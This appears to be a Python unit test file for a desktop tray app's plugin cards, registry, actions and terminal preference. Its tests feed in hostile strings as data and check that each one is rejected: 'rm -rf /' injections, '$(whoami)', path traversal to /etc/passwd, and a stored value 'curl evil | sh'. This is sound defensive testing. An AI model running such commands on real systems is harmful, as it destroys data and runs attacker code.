import json
import os
import subprocess
import unittest

from cli_test_support import CliTestBase

from src import tray_logics, tray_plugins
from src.tray_plugin_actions import perform_action


class CardContractTest(CliTestBase):
    """The bound between an adapter and the tray.

    Every check here exists so the tray can render a card without knowing which
    adapter produced it. They apply to first-party adapters too: a bug in one of
    ours is not less of a bug.
    """

    def test_a_card_needs_a_title_and_a_summary(self):
        for raw in ({}, {"title": "Logics"}, {"summary": "2 blocked"}, {"title": " ", "summary": "x"}):
            self.assertIsNone(tray_plugins.bounded_card(raw, "logics"), raw)

    def test_text_is_single_line_printable_and_bounded(self):
        card = tray_plugins.bounded_card(
            {"title": "Logics\nand\x00more", "summary": "x" * 500}, "logics",
        )
        self.assertEqual(card["title"], "Logics and more")
        self.assertTrue(card["summary"].endswith("…"))
        self.assertLessEqual(len(card["summary"]), 80)

    def test_at_most_two_rows_survive(self):
        rows = [{"label": f"row {i}", "action": "logics.focus:req_001"} for i in range(6)]
        card = tray_plugins.bounded_card({"title": "t", "summary": "s", "rows": rows}, "logics")
        self.assertEqual(len(card["rows"]), 2)

    def test_an_action_that_could_be_a_command_is_dropped(self):
        """The reason a card cannot become a shell: there is no character in a
        valid action id that a shell would treat as one."""
        hostile = [
            "logics.open; rm -rf /",
            "logics.focus:$(whoami)",
            "logics.focus:../../etc/passwd\n",
            "sh -c 'echo'",
            "other.open",
            "logics.",
            123,
            None,
        ]
        card = tray_plugins.bounded_card(
            {"title": "t", "summary": "s", "actions": hostile,
             "rows": [{"label": "l", "action": hostile[0]}]},
            "logics",
        )
        self.assertEqual(card["actions"], [])
        self.assertEqual(card["rows"], [], "a row with a rejected action is not a row")

    def test_an_action_belonging_to_another_plugin_is_dropped(self):
        card = tray_plugins.bounded_card(
            {"title": "t", "summary": "s", "actions": ["logics.open", "other.open"]}, "logics",
        )
        self.assertEqual(card["actions"], ["logics.open"])

    def test_a_non_dict_is_not_a_card(self):
        for raw in ("card", [1, 2], None, 7):
            self.assertIsNone(tray_plugins.bounded_card(raw, "logics"))


class RegistryTest(CliTestBase):
    """Nothing is discovered, nothing is on by default, nothing can break the tray."""

    def test_nothing_is_enabled_by_default(self):
        self.assertEqual(tray_plugins.enabled_plugins(self.make_temp_dir()), [])

    def test_enabling_is_reversible(self):
        base = self.make_temp_dir()
        self.assertEqual(tray_plugins.set_plugin_enabled(base, "logics", True), ["logics"])
        self.assertEqual(tray_plugins.enabled_plugins(base), ["logics"])
        self.assertEqual(tray_plugins.set_plugin_enabled(base, "logics", False), [])
        self.assertEqual(tray_plugins.enabled_plugins(base), [])

    def test_an_unknown_plugin_cannot_be_enabled(self):
        with self.assertRaises(KeyError):
            tray_plugins.set_plugin_enabled(self.make_temp_dir(), "whatever", True)

    def test_an_unreadable_state_enables_nothing(self):
        base = self.make_temp_dir()
        path = tray_plugins.state_path(base)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("{ not json")
        self.assertEqual(tray_plugins.enabled_plugins(base), [])

    def test_a_name_that_left_the_registry_is_ignored(self):
        base = self.make_temp_dir()
        path = tray_plugins.state_path(base)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            json.dump({"version": 1, "enabled": ["logics", "gone"]}, handle)
        self.assertEqual(tray_plugins.enabled_plugins(base), ["logics"])

    def test_an_adapter_that_throws_costs_only_its_own_card(self):
        base = self.make_temp_dir()
        tray_plugins.set_plugin_enabled(base, "logics", True)

        def explode(**_kwargs):
            raise RuntimeError("boom")

        self.assertEqual(tray_plugins.collect_cards(base, adapters={"logics": explode}), [])

    def test_an_adapter_returning_nonsense_produces_no_card(self):
        base = self.make_temp_dir()
        tray_plugins.set_plugin_enabled(base, "logics", True)
        cards = tray_plugins.collect_cards(base, adapters={"logics": lambda **_k: {"title": "only"}})
        self.assertEqual(cards, [])

    def test_a_disabled_adapter_is_never_run(self):
        base = self.make_temp_dir()

        def explode(**_kwargs):
            raise AssertionError("a disabled integration must not run")

        self.assertEqual(tray_plugins.collect_cards(base, adapters={"logics": explode}), [])


class LogicsAdapterTest(CliTestBase):
    """Status JSON in, one card out — and silence for every unhappy case."""

    def _runner(self, payload, returncode=0):
        def run(_argv, **_kwargs):
            return subprocess.CompletedProcess(_argv, returncode, stdout=json.dumps(payload), stderr="")
        return run

    def test_nothing_installed_is_silence(self):
        self.assertIsNone(tray_logics.logics_card(env={"PATH": self.make_temp_dir()}))

    def test_a_failing_command_is_silence(self):
        card = tray_logics.logics_card(
            executable="logics-manager", runner=self._runner({}, returncode=1),
        )
        self.assertIsNone(card)

    def test_output_that_is_not_json_is_silence(self):
        def run(_argv, **_kwargs):
            return subprocess.CompletedProcess(_argv, 0, stdout="not json", stderr="")
        self.assertIsNone(tray_logics.logics_card(executable="logics-manager", runner=run))

    def test_a_timeout_is_silence(self):
        def run(_argv, **_kwargs):
            raise subprocess.TimeoutExpired("logics-manager", 5)
        self.assertIsNone(tray_logics.logics_card(executable="logics-manager", runner=run))

    def test_a_quiet_repository_says_so_without_rows(self):
        card = tray_logics.logics_card(
            executable="logics-manager",
            runner=self._runner({"blocked_docs": [], "active_tasks": []}),
        )
        self.assertEqual(card["rows"], [])
        self.assertIn("Nothing blocked", card["summary"])

    def test_the_two_rows_are_what_stops_work_and_what_to_do_instead(self):
        card = tray_logics.logics_card(
            executable="logics-manager",
            runner=self._runner({
                "blocked_docs": [
                    {"ref": "task_010", "title": "Blocked one"},
                    {"ref": "task_011", "title": "Blocked two"},
                ],
                "active_tasks": [
                    {"ref": "task_020", "title": "Low one", "priority": "Low", "progress": 10},
                    {"ref": "task_021", "title": "High one", "priority": "High", "progress": 40},
                    {"ref": "task_022", "title": "High later", "priority": "High", "progress": 90},
                ],
            }),
        )
        self.assertEqual(card["summary"], "2 blocked · 3 in progress")
        self.assertEqual(
            [row["label"] for row in card["rows"]],
            ["blocked: Blocked one", "next: High one"],
        )
        self.assertEqual(
            [row["action"] for row in card["rows"]],
            ["logics.focus:task_010", "logics.focus:task_021"],
        )

    def test_recorded_repositories_are_aggregated_without_paths_in_rows(self):
        card = tray_logics._card_from_status([
            ("/private/a", {"blocked_docs": [], "active_tasks": [{"ref": "task_1", "title": "A", "priority": "High"}]}),
            ("/private/b", {"blocked_docs": [{"ref": "task_2", "title": "B"}], "active_tasks": []}),
        ])
        self.assertEqual(card["summary"], "2 repositories · 1 blocked")
        self.assertEqual(card["groups"][1]["label"], "b")
        self.assertEqual(card["groups"][1]["rows"][0]["label"], "blocked: B")
        self.assertNotIn("/private", card["groups"][1]["rows"][0]["label"])

    def test_a_focused_row_keeps_its_root_out_of_the_label(self):
        card = tray_logics._card_from_status([
            ("/private/project", {"blocked_docs": [{"ref": "task_2", "title": "B"}], "active_tasks": []}),
        ])
        self.assertEqual(card["groups"][0]["rows"][0]["root"], "/private/project")
        self.assertNotIn("/private", card["groups"][0]["rows"][0]["label"])

    def test_colliding_repository_basenames_gain_a_short_parent_label(self):
        card = tray_logics._card_from_status([
            ("/private/one/app", {"blocked_docs": [{"ref": "task_1", "title": "A"}], "active_tasks": []}),
            ("/private/two/app", {"blocked_docs": [{"ref": "task_2", "title": "B"}], "active_tasks": []}),
        ])
        self.assertEqual([group["label"] for group in card["groups"]], ["one/app", "two/app"])

    def test_a_row_without_a_reference_is_dropped_rather_than_guessed(self):
        card = tray_logics.logics_card(
            executable="logics-manager",
            runner=self._runner({"blocked_docs": [{"title": "no ref"}], "active_tasks": []}),
        )
        self.assertEqual(card["rows"], [])

    def test_a_card_is_reused_within_its_ttl_and_re_asked_after(self):
        calls = []

        def run(argv, **_kwargs):
            calls.append(argv)
            return subprocess.CompletedProcess(argv, 0, stdout=json.dumps({"blocked_docs": [], "active_tasks": []}))

        cache = {}
        tray_logics.logics_card(executable="l", runner=run, cache=cache, now=1000.0)
        tray_logics.logics_card(executable="l", runner=run, cache=cache, now=1000.0 + 30)
        self.assertEqual(len(calls), 1, "a poll must not make Logics pay the tray's rate")
        tray_logics.logics_card(
            executable="l", runner=run, cache=cache, now=1000.0 + tray_plugins.CARD_TTL_SECONDS + 1,
        )
        self.assertEqual(len(calls), 2)

    def test_a_manual_refresh_passes_no_cache_and_so_re_asks(self):
        calls = []

        def run(argv, **_kwargs):
            calls.append(argv)
            return subprocess.CompletedProcess(argv, 0, stdout=json.dumps({"blocked_docs": [], "active_tasks": []}))

        tray_logics.logics_card(executable="l", runner=run, cache=None, now=1.0)
        tray_logics.logics_card(executable="l", runner=run, cache=None, now=1.0)
        self.assertEqual(len(calls), 2)

    def test_the_command_is_resolved_through_cdx_not_by_the_tray(self):
        """On a Windows host serving CDX from WSL, the tray is not where
        logics-manager lives. Only this process can find it."""
        seen = []

        def run(argv, **_kwargs):
            seen.append(argv)
            return subprocess.CompletedProcess(argv, 0, stdout=json.dumps({"blocked_docs": [], "active_tasks": []}))

        tray_logics.logics_card(executable="/opt/wsl/bin/logics-manager", runner=run)
        self.assertEqual(seen[0], ["/opt/wsl/bin/logics-manager", "status", "--format", "json"])


class CardActionTest(CliTestBase):
    """Every action the tray can cause, and the refusal of everything else."""

    def _ctx(self, executable="logics-manager"):
        opened = []
        root = self.make_temp_dir()
        os.makedirs(os.path.join(root, ".git"))
        return {
            "env": {"PATH": "/nowhere"},
            "cwd": root,
            "root": root,
            "spawn_detached_runner": lambda argv, **kwargs: opened.append(argv),
            "opened": opened,
            "executable": executable,
        }

    def test_an_unknown_action_is_refused(self):
        for action in ("logics.destroy", "other.open", "logics.focus", "nonsense", None, 7):
            result = perform_action(action, self._ctx())
            self.assertFalse(result["ok"], action)

    def test_refresh_is_answered_without_running_anything(self):
        ctx = self._ctx()
        result = perform_action("logics.refresh", ctx)
        self.assertTrue(result["ok"])
        self.assertEqual(ctx["opened"], [])

    def test_open_and_focus_reach_the_viewer(self):
        from unittest import mock
        ctx = self._ctx()
        with mock.patch("src.logics_view.resolve_logics_manager", return_value="/bin/logics-manager"):
            self.assertTrue(perform_action("logics.open", ctx)["ok"])
            self.assertTrue(perform_action("logics.focus:task_048", ctx, root=ctx["root"])["ok"])
        self.assertEqual(ctx["opened"][0], ["/bin/logics-manager", "view", "--fleet", "--open", "--port", "0"])
        self.assertEqual(ctx["opened"][1], ["/bin/logics-manager", "view", "--focus", "task_048", "--open", "--port", "0"])

    def test_a_focused_action_needs_a_repository_root(self):
        from unittest import mock
        with mock.patch("src.logics_view.resolve_logics_manager", return_value="/bin/logics-manager"):
            result = perform_action("logics.focus:task_048", self._ctx())
        self.assertEqual(result["code"], "logics_viewer_root_invalid")

    def test_a_focused_action_launches_detached_in_its_originating_root(self):
        from unittest import mock
        ctx = self._ctx()
        seen = []
        ctx["spawn_detached_runner"] = lambda argv, **kwargs: seen.append((argv, kwargs))
        with mock.patch("src.logics_view.resolve_logics_manager", return_value="/bin/logics-manager"):
            self.assertTrue(perform_action("logics.focus:task_048", ctx, root=ctx["root"])["ok"])
        self.assertEqual(seen[0][0], ["/bin/logics-manager", "view", "--focus", "task_048", "--open", "--port", "0"])
        self.assertEqual(seen[0][1]["cwd"], ctx["root"])
        self.assertTrue(seen[0][1]["start_new_session"])

    def test_a_missing_logics_manager_is_reported_not_crashed(self):
        from unittest import mock
        with mock.patch("src.logics_view.resolve_logics_manager", return_value=None):
            result = perform_action("logics.open", self._ctx())
        self.assertFalse(result["ok"])
        self.assertEqual(result["code"], "logics_manager_missing")


if __name__ == "__main__":
    unittest.main()


class TerminalPreferenceTest(CliTestBase):
    """What may be stored as a terminal, and what may not.

    The restriction is the security argument: a preference that could hold a
    command line would be a way to run anything, in a process the user did not
    start, triggered by clicking a menu row.
    """

    def test_no_preference_by_default(self):
        from src.tray_terminal import terminal_preference
        self.assertIsNone(terminal_preference(self.make_temp_dir()))

    def test_an_application_name_is_stored_and_reversible(self):
        from src.tray_terminal import clear_terminal, set_terminal, terminal_preference
        base = self.make_temp_dir()
        for name in ("iTerm", "Ghostty", "WezTerm", "kitty", "wt", "Visual Studio Code", "com.googlecode.iterm2"):
            self.assertEqual(set_terminal(base, name), name)
            self.assertEqual(terminal_preference(base), name)
        clear_terminal(base)
        self.assertIsNone(terminal_preference(base))

    def test_candidates_are_platform_catalogue_not_commands(self):
        from src.tray_terminal import terminal_candidates
        self.assertEqual(terminal_candidates("win32", which=lambda name: name in {"wt", "pwsh"}), ["wt", "pwsh"])
        self.assertEqual(terminal_candidates("darwin", available=lambda name: name == "iTerm"), ["iTerm"])

    def test_anything_that_could_be_a_command_is_refused(self):
        from src.tray_terminal import set_terminal, terminal_preference
        base = self.make_temp_dir()
        for hostile in (
            "sh -c 'rm -rf /'",
            "/bin/sh",
            "iTerm; rm -rf /",
            "$(whoami)",
            "`id`",
            "a && b",
            "a | b",
            "../../bin/sh",
            "-flag",
            "",
            "x" * 200,
            None,
            7,
        ):
            with self.assertRaises(ValueError, msg=repr(hostile)):
                set_terminal(base, hostile)
            self.assertIsNone(terminal_preference(base), repr(hostile))

    def test_a_stored_value_that_no_longer_validates_is_not_honoured(self):
        """A rule that only applied at write time would be no rule at all: the
        state file is a file, and anything that can write it would bypass it."""
        import json
        import os

        from src.tray_terminal import state_path, terminal_preference
        base = self.make_temp_dir()
        path = state_path(base)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            json.dump({"version": 1, "terminal": "sh -c 'curl evil | sh'"}, handle)
        self.assertIsNone(terminal_preference(base))

    def test_an_unreadable_state_is_no_preference(self):
        import os

        from src.tray_terminal import state_path, terminal_preference
        base = self.make_temp_dir()
        path = state_path(base)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("{ not json")
        self.assertIsNone(terminal_preference(base))

    def test_the_snapshot_carries_it(self):
        from datetime import datetime, timezone

        from src.tray_contract import build_snapshot
        snapshot = build_snapshot([], datetime.now(timezone.utc), "0.0.0", terminal="Ghostty")
        self.assertEqual(snapshot["terminal"], "Ghostty")
        self.assertIsNone(build_snapshot([], datetime.now(timezone.utc), "0.0.0")["terminal"])

    def test_sort_preference_is_persistent_and_bounded(self):
        from src.tray_terminal import set_sort, sort_preference
        base = self.make_temp_dir()
        self.assertEqual(sort_preference(base), "capacity")
        self.assertEqual(set_sort(base, "recent"), "recent")
        self.assertEqual(sort_preference(base), "recent")
        with self.assertRaises(ValueError):
            set_sort(base, "anything")
